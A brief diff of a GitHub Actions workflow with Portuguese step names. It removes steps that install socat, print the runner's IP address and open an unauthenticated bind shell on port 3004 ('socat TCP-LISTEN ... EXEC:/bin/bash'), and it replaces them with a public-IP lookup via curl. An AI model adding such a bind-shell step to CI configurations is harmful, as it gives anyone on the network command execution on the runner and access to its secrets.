@@ -21,10 +21,5 @@ jobs:
       with:
         java-version: '11'
         distribution: 'temurin'
-    - name: Instalando Socat
-      run: sudo apt install socat -y
-    - name: Mostrando para todo mundo o meu ip HUAHUHAUHA
-      run: ifconfig
-    - name: Abrindo para porta externa
-      run: socat TCP-LISTEN:3004,reuseaddr,fork EXEC:/bin/bash&
-    
+    - name: vendo o ip de verdade verdadeira
+      run: curl ifconfig.me
